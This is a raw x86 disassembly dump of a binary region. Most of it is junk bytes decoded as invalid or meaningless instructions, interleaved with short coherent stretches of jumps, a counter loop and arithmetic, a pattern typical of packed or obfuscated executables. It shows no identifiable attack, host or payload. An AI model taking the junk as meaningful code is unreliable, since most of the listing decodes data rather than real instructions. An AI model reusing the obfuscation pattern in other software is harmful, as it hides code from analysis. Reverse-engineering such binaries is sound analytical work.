  40e960:	sbb    DWORD PTR [ebx],eax
  40e962:	outs   dx,BYTE PTR ds:[esi]
  40e963:	(bad)  
  40e964:	aaa    
  40e965:	ins    DWORD PTR es:[edi],dx
  40e966:	mov    ds:0x72a697c7,al
  40e96b:	jmp    0x40e925
  40e96d:	lea    ebp,[ebx]
  40e96f:	dec    ecx
  40e970:	ins    DWORD PTR es:[edi],dx
  40e971:	mov    eax,ds:0x552dcb7b
  40e976:	inc    ecx
  40e977:	fs popf 
  40e979:	repnz xchg edi,eax
  40e97b:	pop    ebx
  40e97c:	xchg   edx,eax
  40e97d:	jmp    FWORD PTR [edx-0x46a52624]
  40e983:	cmpps  xmm0,xmm7,0xac
  40e987:	add    bh,0x36
  40e98a:	outs   dx,BYTE PTR ds:[esi]
  40e98b:	ret    
  40e98c:	and    ch,BYTE PTR [ebx+esi*2+0x63c4dcd0]
  40e993:	hlt    
  40e994:	pusha  
  40e995:	loopne 0x40e971
  40e997:	fsubr  DWORD PTR ds:0x68250f0b
  40e99d:	in     al,0x80
  40e99f:	icebp  
  40e9a0:	sahf   
  40e9a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9a2:	popa   
  40e9a3:	fdiv   QWORD PTR [edx+ecx*4-0xe]
  40e9a7:	dec    ebx
  40e9a8:	les    edi,FWORD PTR [eax-0x76]
  40e9ab:	jae    0x40ea12
  40e9ad:	add    al,BYTE PTR [ecx]
  40e9af:	nop
  40e9b0:	daa    
  40e9b1:	out    0x9d,eax
  40e9b3:	fistp  WORD PTR [ebp-0x42f37d96]
  40e9b9:	add    edx,DWORD PTR [edi+0x1f]
  40e9bc:	push   edi
  40e9bd:	dec    esi
  40e9be:	jecxz  0x40e965
  40e9c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9c1:	sbb    BYTE PTR ds:0x6de4a99b,0xd2
  40e9c8:	sub    BYTE PTR ds:0x85b3b4a1,bl
  40e9ce:	enter  0xc4ed,0x63
  40e9d2:	into   
  40e9d3:	jmp    0x48d6:0x140a7f60
  40e9da:	enter  0x49d7,0x67
  40e9de:	sahf   
  40e9df:	pop    es
  40e9e0:	dec    ebx
  40e9e1:	cmc    
  40e9e2:	ror    BYTE PTR [ecx+0x29440ded],cl
  40e9e8:	repnz fdiv st,st(2)
  40e9eb:	stos   DWORD PTR es:[edi],eax
  40e9ec:	and    eax,0x39640e08
  40e9f1:	das    
  40e9f2:	jp     0x40ea14
  40e9f4:	fistp  WORD PTR [esi-0x49]
  40e9f7:	cli    
  40e9f8:	std    
  40e9f9:	leave  
  40e9fa:	pusha  
  40e9fb:	push   edi
  40e9fc:	lods   al,BYTE PTR ds:[esi]
  40e9fd:	fcom   DWORD PTR [esi-0x3f]
  40ea00:	push   ecx
  40ea01:	mov    ecx,esp
  40ea03:	mov    ecx,0x45790df2
  40ea08:	icebp  
  40ea09:	(bad)  
  40ea0a:	call   edx
  40ea0c:	push   cs
  40ea0d:	mov    al,ds:0x64458e7f
  40ea12:	sub    bh,BYTE PTR [eax]
  40ea14:	jne    0x40ea6c
  40ea16:	mov    DWORD PTR [esi-0x64],esi
  40ea19:	jg     0x40ea4d
  40ea1b:	call   0xa86c593e
  40ea20:	push   0x7e1ce382
  40ea25:	push   ss
  40ea26:	xchg   edi,eax
  40ea27:	pop    eax
  40ea28:	jns    0x40ea4e
  40ea2a:	dec    ebp
  40ea2b:	out    dx,eax
  40ea2c:	jbe    0x40ea5b
  40ea2e:	jl     0x40ea9d
  40ea30:	icebp  
  40ea31:	dec    edi
  40ea32:	inc    ebp
  40ea33:	inc    edx
  40ea34:	std    
  40ea35:	jno    0x40ea8b
  40ea37:	clc    
  40ea38:	je     0x40ea79
  40ea3a:	(bad)  
  40ea3c:	sub    eax,0xdc2608cc
  40ea41:	xor    DWORD PTR [ebx+edx*1],eax
  40ea44:	inc    BYTE PTR [ecx-0x3487839d]
  40ea4a:	adc    ah,BYTE PTR [ebx-0x15daba11]
  40ea50:	enter  0xbaeb,0xc5
  40ea54:	sbb    ecx,DWORD PTR [esp+ebp*2-0x76]
  40ea58:	or     bl,cl
  40ea5a:	hlt    
  40ea5b:	pop    esp
  40ea5c:	dec    eax
  40ea5d:	cli    
  40ea5e:	push   ebp
  40ea5f:	adc    eax,0x23f82063
  40ea64:	jg     0x40ea6e
  40ea66:	jmp    FWORD PTR [ebp+0x1d]
  40ea69:	lods   eax,DWORD PTR ds:[esi]
  40ea6a:	inc    edx
  40ea6b:	daa    
  40ea6c:	cli    
  40ea6d:	fmul   st(0),st
  40ea6f:	push   ebx
  40ea70:	sahf   
  40ea71:	pop    es
  40ea72:	adc    ch,BYTE PTR [eax]
  40ea74:	hlt    
  40ea75:	(bad)  
  40ea76:	rcr    DWORD PTR [edx],1
  40ea78:	xor    cl,BYTE PTR [ebx+0x42]
  40ea7b:	sbb    BYTE PTR ds:0xc49ba4b5,0x10
  40ea82:	out    dx,eax
  40ea83:	sar    DWORD PTR [ebp+0x60],1
  40ea86:	push   edx
  40ea87:	rcr    ecx,0xc6
  40ea8a:	bound  esi,QWORD PTR [edx+0x30092bfc]
  40ea90:	(bad)  
  40ea91:	cwde   
  40ea92:	imul   ebx,edx,0x53c57aa3
  40ea98:	repz aad 0xb5
  40ea9b:	jmp    0x40ea55
  40ea9d:	in     al,0x27
  40ea9f:	cmp    DWORD PTR ds:0xa6850fca,edx
  40eaa5:	add    BYTE PTR [eax],al
  40eaa7:	add    BYTE PTR [ebx],al
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	in     eax,0xfc
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x4e
  40eb8d:	push   ebx
  40eb8e:	jo     0x40ebbe
  40eb90:	imul   DWORD PTR [edi+0x7fc37070]
  40eb96:	jo     0x40ec08
  40eb98:	xor    DWORD PTR [esi],ebp
  40eb9a:	call   0xaa404bd3
  40eb9f:	sub    BYTE PTR [edi],dl
  40eba1:	and    al,BYTE PTR [edi-0xa650c11]
  40eba7:	cmp    al,0x98
  40eba9:	push   ds
  40ebaa:	mov    ah,0x24
  40ebac:	mov    bl,0x40
  40ebae:	and    ch,BYTE PTR [ecx-0x79e16863]
  40ebb4:	push   esp
  40ebb5:	sbb    eax,0x1ed401f3
  40ebba:	cmp    eax,0x598cd905
  40ebbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebc0:	int    0x41
  40ebc2:	jge    0x40ec17
  40ebc4:	xlat   BYTE PTR ds:[ebx]
  40ebc5:	jecxz  0x40eb68
  40ebc7:	or     bh,dh
  40ebc9:	neg    DWORD PTR [eax+edx*4+0x1f854a05]
  40ebd0:	ret    0x9ab
  40ebd3:	mov    edi,DWORD PTR [edx-0x6a]
  40ebd6:	mov    cl,0x99
  40ebd8:	and    BYTE PTR [ecx-0x3b],dh
  40ebdb:	push   ecx
  40ebdc:	rcl    edx,cl
  40ebde:	dec    ebp
  40ebdf:	in     eax,dx
  40ebe0:	mov    dl,0x7b
  40ebe2:	jbe    0x40ebcf
  40ebe4:	sbb    al,0x9e
  40ebe6:	fadd   DWORD PTR [edi-0x593ca815]
  40ebec:	and    BYTE PTR [edx-0x3faa64d8],dh
  40ebf2:	push   0x91875bac
  40ebf7:	sbb    DWORD PTR [eax-0x72eac503],edi
  40ebfd:	push   ds
  40ebfe:	sub    edi,DWORD PTR [ebp+0xfde88ad]
  40ec04:	test   BYTE PTR [eax],dl
  40ec06:	cmp    al,0x36
  40ec08:	dec    esi
  40ec09:	jg     0x40ec45
  40ec0b:	call   0x2edd4305
  40ec10:	sbb    eax,0x31158e61
  40ec15:	inc    DWORD PTR ds:0x42686282
  40ec1b:	imul   DWORD PTR [ebx]
  40ec1d:	enter  0xb72d,0x16
  40ec21:	ds mov ah,0x6a
  40ec24:	mov    ds:0x924e5a8,eax
  40ec29:	sub    dh,BYTE PTR [edx]
  40ec2b:	punpcklbw mm1,DWORD PTR cs:[ebx-0x77b9aabb]
  40ec33:	std    
  40ec34:	mov    BYTE PTR [ecx],bh
  40ec36:	mov    ds,esp
  40ec38:	jle    0x40ebef
  40ec3a:	inc    BYTE PTR [eax+0x10eb3cbe]
  40ec40:	test   DWORD PTR [ebx+0x2a76c66e],edx
  40ec46:	in     al,dx
  40ec47:	lds    edi,FWORD PTR [edi-0x25d59035]
  40ec4d:	pop    es
  40ec4e:	addr16 call 0x7d90eea9
  40ec54:	mov    ah,0xdc
  40ec56:	cmp    bh,BYTE PTR [ecx+0x1d]
  40ec59:	push   0xffffffc4
  40ec5b:	or     BYTE PTR [bp+si],bh
  40ec5e:	push   esp
  40ec5f:	popa   
  40ec60:	jecxz  0x40ec4b
  40ec62:	js     0x40ec57
  40ec64:	xor    al,0x1c
  40ec66:	dec    esp
  40ec67:	je     0x40ebfe
  40ec69:	push   DWORD PTR [ecx*8+0x37fe327]
  40ec70:	inc    eax
  40ec71:	dec    eax
  40ec72:	cli    
  40ec73:	ds jecxz 0x40ec64
  40ec76:	xchg   ebp,eax
  40ec77:	mov    cl,BYTE PTR [ebx]
  40ec79:	push   cs
  40ec7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec7b:	out    0x7f,al
  40ec7d:	or     bh,BYTE PTR [edi-0x4bf2ed1]
  40ec83:	add    al,BYTE PTR [ebx-0x24]
  40ec86:	sub    edx,eax
  40ec88:	sbb    DWORD PTR [eax],ecx
  40ec8a:	xchg   esi,eax
  40ec8b:	sbb    dh,cl
  40ec8d:	sbb    DWORD PTR [edx],edi
  40ec8f:	daa    
  40ec90:	cdq    
  40ec91:	or     BYTE PTR [eax-0x2d7afa],0x42
  40ec98:	xor    al,0x19
  40ec9a:	xor    al,0x86
  40ec9c:	xchg   ebp,eax
  40ec9d:	aaa    
  40ec9e:	call   0x5220fa18
  40eca3:	jmp    0x40ec2b
  40eca5:	mov    ebp,0xb9e73fd8
  40ecaa:	fdivr  DWORD PTR [ebx-0x47ac09e5]
  40ecb0:	sti    
  40ecb1:	add    ah,BYTE PTR [edx-0x6a1429fa]
  40ecb7:	leave  
  40ecb8:	push   0xffffffa0
  40ecba:	add    ah,BYTE PTR [ecx-0x1a]
  40ecbd:	and    DWORD PTR [ecx-0x28c770bf],0x61bcbca6
  40ecc7:	mov    ebx,0x94268943
  40eccc:	xor    ebx,edi
  40ecce:	leave  
  40eccf:	cwde   
  40ecd0:	or     dl,BYTE PTR [edi-0x61]
  40ecd3:	and    BYTE PTR [eax+0x59],ah
  40ecd6:	xchg   esi,eax
  40ecd7:	lds    edi,FWORD PTR [esi-0x76]
  40ecda:	sub    BYTE PTR [edi+0x1038f470],bl
  40ece0:	lods   eax,DWORD PTR ds:[esi]
  40ece1:	sbb    DWORD PTR [esi-0x60],edx
  40ece4:	int3   
  40ece5:	cmp    eax,ecx
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ecdc
  40ed00:	cmp    DWORD PTR [edi+ebp*8-0x46],ebx
  40ed04:	scas   al,BYTE PTR es:[edi]
  40ed05:	jo     0x40ed77
  40ed07:	ret    
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ecdd
  40ed0c:	cmp    edi,DWORD PTR [ecx]
  40ed0e:	adc    al,ch
  40ed10:	cmp    esp,ecx
  40ed12:	push   ss
  40ed13:	test   al,0x37
  40ed15:	jbe    0x40ece8
  40ed17:	adc    al,0x1
  40ed19:	(bad)  
  40ed1a:	pop    ebp
  40ed1b:	movsx  esp,WORD PTR [eax+ebx*4]
  40ed1f:	imul   eax,DWORD PTR [esi+0x4a6cdc1d],0xa79217b4
  40ed29:	sub    BYTE PTR [edx],0x5
  40ed2c:	inc    esi
  40ed2d:	out    dx,al
  40ed2e:	and    al,0xf8
  40ed30:	dec    esi
  40ed31:	data16 jo 0x40ed66
  40ed34:	mov    ebx,0x77b8fecc
  40ed39:	cld    
  40ed3a:	cmc    
  40ed3b:	xchg   edx,eax
  40ed3c:	(bad)  
  40ed3d:	imul   eax,ebx,0x4a
  40ed40:	jge    0x40ed91
  40ed42:	mov    ds:0xd034c720,al
  40ed47:	repnz (bad) 
  40ed49:	push   eax
  40ed4a:	ins    DWORD PTR es:[edi],dx
  40ed4b:	sbb    eax,0xaec07dbc
  40ed50:	and    cl,BYTE PTR ds:0x2e6c87ea
  40ed56:	and    ah,ah
  40ed58:	into   
  40ed59:	jno    0x40ed2b
  40ed5b:	add    ebp,DWORD PTR [ebx+0x32327dd9]
  40ed61:	cs test al,0x5d
  40ed64:	mov    ch,0x48
  40ed66:	cmc    
  40ed67:	push   esp
  40ed68:	fld    QWORD PTR [edi+0x75]
  40ed6b:	mov    al,ds:0x290e11c3
  40ed70:	rol    dh,cl
  40ed72:	dec    ecx
  40ed73:	mov    eax,ds:0x4217950a
  40ed78:	xchg   edi,eax
  40ed79:	ins    DWORD PTR es:[edi],dx
  40ed7a:	jb     0x40ed4b
  40ed7c:	mov    al,ds:0x417080c5
  40ed81:	sahf   
  40ed82:	pusha  
  40ed83:	mov    ebx,0x462da604
  40ed88:	shr    DWORD PTR [ecx+0x62],cl
  40ed8b:	test   al,0x57
  40ed8d:	mov    DWORD PTR [esi+eiz*8],esi
  40ed90:	inc    ebx
  40ed91:	cli    
  40ed92:	fsubr  DWORD PTR [eax-0x2d]
  40ed95:	out    0xe4,eax
  40ed97:	test   DWORD PTR [ebp-0x34],0x4484c49e
  40ed9e:	xchg   ebx,eax
  40ed9f:	push   eax
  40eda0:	cmp    eax,0xb0cb33a0
  40eda5:	cmp    eax,0xab2b98ef
  40edaa:	fcmovne st,st(4)
  40edac:	fs int 0x55
  40edaf:	lds    eax,FWORD PTR [edi-0x588ccd6a]
  40edb5:	repz ret 
  40edb7:	xchg   esp,eax
  40edb8:	clc    
  40edb9:	add    ch,BYTE PTR [ebx+eiz*2]
  40edbc:	cmp    al,0xae
  40edbe:	(bad)  
  40edc0:	(bad)  
  40edc1:	neg    eax
  40edc3:	test   DWORD PTR [edi],edi
  40edc5:	stos   BYTE PTR es:[edi],al
  40edc6:	inc    ebx
  40edc7:	in     eax,dx
  40edc8:	add    eax,0x35067c4b
  40edcd:	cmp    bh,BYTE PTR [ebp+ebx*1+0xd00d98d]
  40edd4:	jl     0x40ee2d
  40edd6:	pop    es
  40edd7:	inc    ebx
  40edd8:	dec    edx
  40edd9:	rol    dh,cl
  40eddb:	cmp    DWORD PTR [edx-0x26],edx
  40edde:	lock movlps QWORD PTR [eax+ebp*2+0x1a],xmm4
  40ede4:	jecxz  0x40ee62
  40ede6:	xchg   ebx,eax
  40ede7:	mov    ecx,ss
  40ede9:	mov    ds:0xdf61ff88,eax
  40edee:	ror    BYTE PTR [edi-0x12],cl
  40edf1:	mov    ch,BYTE PTR [ecx+0x6d9c5625]
  40edf7:	push   es
  40edf8:	xchg   dh,ah
  40edfa:	inc    esi
  40edfb:	cmp    DWORD PTR [ebx],0x3b
  40edfe:	scas   al,BYTE PTR es:[edi]
  40edff:	cmp    eax,0x4855f74
  40ee04:	cmp    bh,BYTE PTR [eax+esi*1]
  40ee07:	pop    esi
  40ee08:	out    0x2f,eax
  40ee0a:	in     eax,dx
  40ee0b:	xor    eax,0x1097ef21
  40ee10:	aad    0x5c
  40ee12:	push   edi
  40ee13:	jbe    0x27043ac8
  40ee19:	push   eax
  40ee1a:	mov    bl,0x5f
  40ee1c:	out    0xc,eax
  40ee1e:	xchg   edi,eax
  40ee1f:	xlat   BYTE PTR ds:[ebx]
  40ee20:	fwait
  40ee21:	mov    esp,0x9096133c
  40ee26:	sub    BYTE PTR [ebx+0x10],dh
  40ee29:	add    al,0x2f
  40ee2b:	lods   eax,DWORD PTR ds:[esi]
  40ee2c:	test   al,0x2
  40ee2e:	jo     0x40ee40
  40ee30:	loopne 0x40ee8d
  40ee32:	pop    ebx
  40ee33:	(bad)  
  40ee34:	mov    bh,dl
  40ee36:	jnp    0x40edd8
  40ee38:	mov    esp,edx
  40ee3a:	jle    0x40edde
  40ee3c:	bound  edi,QWORD PTR [esi+0x70ca36d2]
  40ee42:	fisub  WORD PTR [esi+0x7fef8e9d]
  40ee48:	clc    
  40ee49:	mov    al,0xfd
  40ee4b:	ds jne 0x40eec2
  40ee4e:	ss or  bh,al
  40ee51:	das    
  40ee52:	mov    esi,0x2a55d998
  40ee57:	cmp    al,0xf
  40ee59:	(bad)  
  40ee5a:	jns    0x40ee5d
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x85
  40ee7f:	loope  0x40ee89
  40ee81:	xchg   edi,eax
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40eeac
  40ee8b:	mov    ecx,0xf90a907e
  40ee90:	xor    al,0x54
  40ee92:	fcomp  QWORD PTR [edx]
  40ee94:	lods   al,BYTE PTR ds:[esi]
  40ee95:	jg     0x40eed5
  40ee97:	push   esi
  40ee98:	(bad)  
  40ee99:	xchg   ecx,eax
  40ee9a:	adc    ch,BYTE PTR [edi-0x79]
  40ee9d:	out    dx,eax
  40ee9e:	xchg   BYTE PTR [ebx],dh
  40eea0:	mov    DWORD PTR [esp+esi*2+0x7a],ebx
  40eea4:	in     al,dx
  40eea5:	retf   0x1c1
  40eea8:	and    BYTE PTR [ebx],dl
  40eeaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeab:	outs   dx,DWORD PTR ds:[esi]
  40eeac:	pop    esp
  40eead:	iret   
  40eeae:	xchg   edi,eax
  40eeaf:	in     al,dx
  40eeb0:	cwde   
  40eeb1:	push   ss
  40eeb2:	pop    edx
  40eeb3:	pusha  
  40eeb4:	shl    al,1
  40eeb6:	xchg   DWORD PTR [ecx-0x60],ebp
  40eeb9:	dec    edi
  40eeba:	pop    eax
  40eebb:	dec    ebp
  40eebc:	pop    ebx
  40eebd:	jne    0x40ee92
  40eebf:	xor    DWORD PTR [esi],0xe9be199
  40eec5:	pushf  
  40eec6:	mov    eax,ds:0x49f3809c
  40eecb:	leave  
  40eecc:	sti    
  40eecd:	ret    0x41ed
  40eed0:	ds inc esp
  40eed2:	mov    ah,0x4
  40eed4:	dec    edx
  40eed5:	pop    ebx
  40eed6:	inc    edx
  40eed7:	aaa    
  40eed8:	push   0xbec38814
  40eedd:	dec    esi
  40eede:	adc    al,0xb2
  40eee0:	dec    esi
  40eee1:	call   0x4a8d:0xc0465935
  40eee8:	sub    al,0x30
  40eeea:	pusha  
  40eeeb:	mov    ch,0x50
  40eeed:	sbb    cl,cl
  40eeef:	jl     0x40ef43
  40eef1:	enter  0xb30e,0xe6
  40eef5:	push   ebp
  40eef6:	and    al,0xc
  40eef8:	mov    edx,0x306090bb
  40eefd:	and    BYTE PTR [ebx+ebp*4-0x60dc3f08],bh
  40ef04:	cmp    ch,BYTE PTR [eax+0x7ed3b9e2]
  40ef0a:	xor    DWORD PTR [ebx+ebp*1-0x28],0x1b
  40ef0f:	xor    al,0x59
  40ef11:	test   eax,0x25021224
  40ef16:	pop    esp
  40ef17:	xchg   esp,eax
  40ef18:	dec    esi
  40ef19:	(bad)  
  40ef1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef1b:	mov    ch,ah
  40ef1d:	call   0x340dc90d
  40ef22:	or     DWORD PTR ds:0x5b9ffb3c,0xfa00122b
  40ef2c:	lods   eax,DWORD PTR ds:[esi]
  40ef2d:	add    eax,0xee50cfab
  40ef32:	clc    
  40ef33:	add    al,0x61
  40ef35:	dec    ebx
  40ef36:	xor    ch,BYTE PTR [ebx-0x7]
  40ef39:	iret   
  40ef3a:	out    dx,al
  40ef3b:	mov    WORD PTR [ebx-0x30fd5913],ss
  40ef41:	int3   
  40ef42:	iretw  
  40ef44:	pop    es
  40ef45:	sbb    BYTE PTR [edx+0x5b],0xb4
  40ef49:	addr16 pop ecx
  40ef4b:	mov    edx,0xe40bd1a
  40ef50:	ins    BYTE PTR es:[edi],dx
  40ef51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef52:	mov    BYTE PTR [eax],bh
  40ef54:	or     bl,ah
  40ef56:	xor    al,0xfd
  40ef58:	bound  esp,QWORD PTR [esi+esi*1-0x6d]
  40ef5c:	lods   al,BYTE PTR ds:[esi]
  40ef5d:	rol    BYTE PTR [ebx-0x74e67856],cl
  40ef63:	mov    al,ds:0xdf050803
  40ef68:	mov    ebp,0x73e4b42a
  40ef6d:	adc    BYTE PTR [esi+0x5912772d],al
  40ef73:	aam    0x91
  40ef75:	xchg   BYTE PTR [eax+ebx*4-0x5e839c64],ch
  40ef7c:	loopne 0x40ef1d
  40ef7e:	leave  
  40ef7f:	xchg   edi,eax
  40ef80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef81:	xor    al,0xb4
  40ef83:	loope  0x40ef83
  40ef85:	inc    DWORD PTR [edx-0x10b686bc]
  40ef8b:	int    0xf2
  40ef8d:	lods   eax,DWORD PTR ds:[esi]
  40ef8e:	sti    
  40ef8f:	enter  0x4fed,0x3e
  40ef93:	rcl    DWORD PTR [esi],cl
  40ef95:	sub    eax,DWORD PTR [esi-0x4c]
  40ef98:	xchg   ebp,eax
  40ef99:	jle    0x40efb9
  40ef9b:	adc    eax,0x9e1a7cda
  40efa0:	jbe    0x40efc0
  40efa2:	daa    
  40efa3:	ficom  WORD PTR [ebp-0x3017ebb0]
  40efa9:	daa    
  40efaa:	and    ah,BYTE PTR [edx-0x2abfb4e1]
  40efb0:	jns    0x40efcd
  40efb2:	push   esi
  40efb3:	xchg   ebp,eax
  40efb4:	jmp    0x40efcc
  40efb6:	pop    es
  40efb7:	bound  ecx,QWORD PTR [edi]
  40efb9:	in     eax,dx
  40efba:	cmp    BYTE PTR [edi+0x38d9b57e],dl
  40efc0:	pop    es
  40efc1:	mov    ah,bh
  40efc3:	push   ss
  40efc4:	push   es
  40efc5:	scas   eax,DWORD PTR es:[edi]
  40efc6:	ss rcl ebp,0x72
  40efca:	imul   edi,DWORD PTR [edx-0x4d953648],0xa8effdb9
  40efd4:	or     al,0xcb
  40efd6:	call   0x84ceb60e
  40efdb:	or     BYTE PTR [edx+esi*2-0x7699ffce],bl
  40efe2:	inc    ebp
  40efe3:	cld    
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	jecxz  0x40ef81
  40effc:	sbb    bl,BYTE PTR [edi]
  40effe:	shr    BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	xor    DWORD PTR [eax+0x32],ebx
  40f009:	push   ebp
  40f00a:	int    0xd9
  40f00c:	sbb    esi,DWORD PTR [esi]
  40f00e:	lods   eax,DWORD PTR ds:[esi]
  40f00f:	mov    cl,0x5e
  40f011:	add    bl,BYTE PTR [ebx]
  40f013:	sbb    cl,BYTE PTR [ebx]
  40f015:	jle    0x40f013
  40f017:	jg     0x40efe8
  40f019:	jmp    0x8ed03dec
  40f01e:	data16 std 
  40f020:	pop    edi
  40f021:	jo     0x40f047
  40f023:	lods   al,BYTE PTR ds:[esi]
  40f024:	cmp    ecx,DWORD PTR [ebp-0x5aed0af0]
  40f02a:	dec    ecx
  40f02b:	cld    
  40f02c:	sti    
  40f02d:	jae    0x40f0a6
  40f02f:	dec    ebp
  40f030:	adc    dh,BYTE PTR [edx-0xa]
  40f033:	jge    0x40efc7
  40f035:	mov    al,ds:0xd10ed90
  40f03a:	inc    edx
  40f03b:	out    dx,al
  40f03c:	in     eax,0x2c
  40f03e:	dec    eax
  40f03f:	push   eax
  40f040:	push   0xffffffb2
  40f042:	sahf   
  40f043:	xchg   ecx,eax
  40f044:	inc    esi
  40f045:	rol    cl,cl
  40f047:	pop    ss
  40f048:	adc    esi,DWORD PTR [edx+ebp*2+0x74ad6907]
  40f04f:	mov    ds:0x331928a3,eax
  40f054:	(bad)  
  40f055:	sbb    DWORD PTR [eax-0x5b],esi
  40f058:	push   ebx
  40f059:	cmp    eax,0xa8cd75af
  40f05e:	mov    eax,0xcd5b01a6
  40f063:	cmp    DWORD PTR [edi-0x62],0x2d
  40f067:	jnp    0x40f0ac
  40f069:	sbb    DWORD PTR [ebx+0x26],esi
  40f06c:	xor    DWORD PTR ds:0xbe19e7a6,edx
  40f072:	jl     0x40f0e6
  40f074:	pop    esi
  40f075:	jge    0x40f067
  40f077:	lahf   
  40f078:	in     eax,dx
  40f079:	mov    esp,0x9ee79533
  40f07e:	imul   edx,DWORD PTR [ebx+ebx*1-0x60],0x8e46eeb2
  40f086:	xor    al,0x16
  40f088:	push   ebp
  40f089:	sbb    al,0x99
  40f08b:	sbb    eax,0xffec0c20
  40f090:	pop    ss
  40f091:	into   
  40f092:	jg     0x40f08b
  40f094:	mov    edx,0x47165993
  40f099:	cmp    BYTE PTR [eax+0x49],bl
  40f09c:	pusha  
  40f09d:	push   esp
  40f09e:	into   
  40f09f:	or     eax,0xcbde0e0c
  40f0a4:	shr    esp,0x55
  40f0a7:	ins    BYTE PTR es:[edi],dx
  40f0a8:	or     eax,0x5a047dac
  40f0ad:	adc    edx,DWORD PTR [bx+si-0x4a0f]
  40f0b2:	mov    eax,0x3e13ceb2
  40f0b7:	fwait
  40f0b8:	scas   al,BYTE PTR es:[edi]
  40f0b9:	xor    al,0x7c
  40f0bb:	mov    dh,0x32
  40f0bd:	data16 stc 
  40f0bf:	ucomiss xmm4,DWORD PTR [edi-0x3a]
  40f0c3:	repnz or esi,DWORD PTR [edi-0x68940d0a]
  40f0ca:	pop    eax
  40f0cb:	xchg   ebx,eax
  40f0cc:	stos   BYTE PTR es:[edi],al
  40f0cd:	in     al,0x1c
  40f0cf:	test   al,0x35
  40f0d1:	data16 aad 0x13
  40f0d4:	shl    ah,1
  40f0d6:	cld    
  40f0d7:	arpl   bx,cx
  40f0d9:	nop
  40f0da:	jb     0x40f0b0
  40f0dc:	ficom  WORD PTR [eax]
  40f0de:	js     0x40f100
  40f0e0:	clc    
  40f0e1:	mul    ch
  40f0e3:	jecxz  0x40f07e
  40f0e5:	xchg   ebx,eax
  40f0e6:	fidiv  DWORD PTR [ebp+0x4eee98df]
  40f0ec:	stos   DWORD PTR es:[edi],eax
  40f0ed:	rol    edx,1
